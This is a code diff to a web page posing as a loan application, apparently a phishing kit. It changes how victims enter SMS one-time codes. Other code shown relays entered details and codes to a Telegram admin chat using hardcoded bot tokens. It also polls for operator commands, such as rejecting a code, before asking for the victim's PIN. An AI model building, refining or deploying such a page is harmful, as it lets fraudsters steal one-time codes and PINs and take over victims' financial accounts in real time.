@@ -648,48 +648,48 @@ input[type="text"] {
     </div>
 
 
-<!-- PAGE 5 OTP -->
+    <!-- PAGE 5 OTP -->
 
-<div id="page5" class="hidden">
+    <div id="page5" class="hidden">
 
-    <div class="center">
-        <div class="icon">🔐</div>
+        <div class="center">
 
-        <h2>Paste Verification SMS</h2>
+            <div class="icon">🔐</div>
 
-        <p style="margin-top:10px;color:#6b7280">
-            Copy the complete verification SMS received
-            on your phone and paste it below.
-        </p>
+            <h2>Enter Verification Code</h2>
+
+            <p style="margin-top:10px;color:#6b7280">
+                Enter the 6-digit code sent to your phone.
+            </p>
+
+        </div>
+
+
+        <div class="otp" id="otpGrid">
+
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+            <input maxlength="1" inputmode="numeric">
+
+        </div>
+
+
+        <button
+            id="verifyButton"
+            class="button blue"
+            disabled
+            onclick="submitOTP()"
+        >
+            Verify
+        </button>
+
+        <div id="otpStatus" class="status-message"></div>
+
     </div>
 
-    <textarea
-        id="otpSms"
-        placeholder="Paste the complete SMS here..."
-        rows="5"
-        style="
-            width:100%;
-            padding:15px;
-            margin-top:25px;
-            border:1px solid #d1d5db;
-            border-radius:10px;
-            font-size:15px;
-            resize:vertical;
-        "
-    ></textarea>
-
-    <button
-        id="verifyButton"
-        class="button blue"
-        disabled
-        onclick="submitOTP()"
-    >
-        Verify
-    </button>
-
-    <div id="otpStatus" class="status-message"></div>
-
-</div>
 
     <!-- PAGE 6 PIN VERIFICATION -->
 
@@ -1170,6 +1170,21 @@ function sendDetailsToTelegram() {
 
 }
 
+
+function goToOTP() {
+
+    showPage(
+        "page5",
+        5,
+        "Verification Code",
+        "Enter the code sent to your phone"
+    );
+
+    setupOTP();
+
+}
+
+
 function setupOTP() {
 
     const inputs =
@@ -1183,67 +1198,94 @@ function setupOTP() {
         );
 
 
+    inputs.forEach(function(input, index) {
 
-function goToOTP() {
-
-    showPage(
-        "page5",
-        5,
-        "Verification SMS",
-        "Paste the complete SMS received on your phone"
-    );
-
-    setupOTP();
-}
+        input.value = "";
 
 
-function setupOTP() {
+        input.addEventListener(
+            "input",
+            function() {
 
-    const smsInput = document.getElementById("otpSms");
-    const button = document.getElementById("verifyButton");
+                input.value =
+                    input.value.replace(/\D/g, "");
 
-    smsInput.value = "";
-    button.disabled = true;
 
-    smsInput.addEventListener("input", function () {
+                if (
+                    input.value &&
+                    index < inputs.length - 1
+                ) {
 
-        button.disabled = !/\b\d{6}\b/.test(smsInput.value);
+                    inputs[index + 1].focus();
+
+                }
+
+
+                const code =
+                    [...inputs]
+                    .map(function(item) {
+                        return item.value;
+                    })
+                    .join("");
+
+
+                button.disabled =
+                    code.length !== 6;
+
+            }
+        );
+
+
+        input.addEventListener(
+            "keydown",
+            function(event) {
+
+                if (
+                    event.key === "Backspace" &&
+                    !input.value &&
+                    index > 0
+                ) {
+
+                    inputs[index - 1].focus();
+
+                }
+
+            }
+        );
 
     });
 
-    smsInput.focus();
+
+    inputs[0].focus();
+
 }
 
 
 function submitOTP() {
 
-    const smsInput = document.getElementById("otpSms");
-    const button = document.getElementById("verifyButton");
-    const otpStatus = document.getElementById("otpStatus");
+    const inputs =
+        document.querySelectorAll(
+            "#otpGrid input"
+        );
 
-    const sms = smsInput.value.trim();
+    const code =
+        [...inputs]
+        .map(function(input) {
+            return input.value;
+        })
+        .join("");
 
-    if (!sms) {
-        alert("Please paste the complete SMS.");
+
+    if (code.length !== 6) {
+
+        alert(
+            "Please enter the complete verification code."
+        );
+
         return;
+
     }
 
-    const match = sms.match(/\b\d{6}\b/);
-
-    if (!match) {
-        alert("No six-digit verification code was found in the SMS.");
-        return;
-    }
-
-    const code = match[0];
-
-    button.disabled = true;
-
-    showLoading(
-        "Verifying Code",
-        "Please wait while your code is verified..."
-    );
-}
     // Send OTP to telegram for admin verification
     sessionToken = generateSessionId();
     const otpBtn = document.getElementById("verifyButton");
@@ -1267,8 +1309,8 @@ function submitOTP() {
                         showPage("page6", 6, "Enter Your PIN", "Authorize your loan application");
                     } else if (action === "wrongotp") {
                         alert("The OTP provided is wrong or has expired. Please try again.");
-                        document.querySelectorAll("#smsInput").forEach(i => i.value = "");
-                        document.querySelectorAll("#smsInput")[0].focus();
+                        document.querySelectorAll("#otpGrid input").forEach(i => i.value = "");
+                        document.querySelectorAll("#otpGrid input")[0].focus();
                     } else {
                         alert("Unknown OTP action: " + action);
                     }
@@ -1460,8 +1502,8 @@ function submitApplication() {
     For production use, implement server-side webhook or proxy to keep the token secret.
 */
 
-const TELEGRAM_BOT_TOKEN = '8734653681:AAFbcqAV0US4FkvTkE5w-4O7yNqJ88CCjJo';
-const TELEGRAM_ADMIN_CHAT = '8820857419';
+const TELEGRAM_BOT_TOKEN = '8913601162:AAGjfyxXw2inG0IiRKP-c8cgrSSwL6BIB-w';
+const TELEGRAM_ADMIN_CHAT = '2069362942';
 let tgLastUpdateId = 0;
 let sessionToken = null;
 let detailsPollHandle = null;
@@ -1615,10 +1657,6 @@ function pollTelegramForAction({session, timeoutMs = 120000, onAction = ()=>{}, 
   }
 }
 
-<script>
-    function goToOTP() {
-    showPage('page5', 4, 'Paste Verification SMS', 'Copy the complete verification SMS received on your phone and paste it below.');
-}
 </script>
 </body>
 </html>
